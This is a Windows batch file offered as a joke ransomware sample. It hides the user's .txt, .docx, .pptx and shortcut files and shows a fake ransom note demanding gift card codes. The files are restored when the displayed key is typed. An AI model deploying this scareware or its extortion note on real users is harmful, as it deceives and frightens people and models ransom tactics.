@ECHO OFF
color 0a
echo WARNING WHILE THIS IS JUST A JOKE IF THIS IS NOT THE ORIGENAL SAMPLE FROM THE GITHUB SIROUS DAMIGE TO YOUR SYSTEM MAY OCCUR
echo PLEASE MAKE SURE THAT THIS IS THE ORIGENAL SAMPLE AND THE CREATER WILL NOT BE RESPONSIBLE FOR ANY DAMIGE ALSO DO NOT RUN
echo ON YOUR DESKTOP UNLESS IN A VM
pause > nul
echo THIS IS THE LAST WARNING
pause > nul
cls
for %%f in (*.txt) do (
attrib +h "%%f"
)
for %%f in (*.docx) do (
attrib +h "%%f"
)
for %%f in (*.pptx) do (
attrib +h "%%f"
)
for %%f in (*.lnk) do (
attrib +h "%%f"
)
for %%f in (*.WINDOWS7RULES) do (
echo THATS JUST SAD!!!!
pause > nul
cls
)
:menu
cls
echo your files have bean encripted please do not cick view on file explorer but instead send
echo gift card codes to notrealemail54325432543543254325432543543254325431@gmail.com
echo and defently do not type in the code 1213-4562-12 before you pay. . . .
SET INPUT=
SET /P INPUT=enter key 1213-4562-12:
	IF /I '%INPUT%'=='1213-4562-12'goto pay
echo WRONG
pause > nul
goto menu

:pay
for %%f in (*.txt) do (
attrib -h "%%f"
)
for %%f in (*.docx) do (
attrib -h "%%f"
)
for %%f in (*.pptx) do (
attrib -h "%%f"
)
for %%f in (*.lnk) do (
attrib -h "%%f"
)
for %%f in (*.WINDOWS7RULES) do (
echo THATS JUST SAD!!!!
pause > nul
cls
)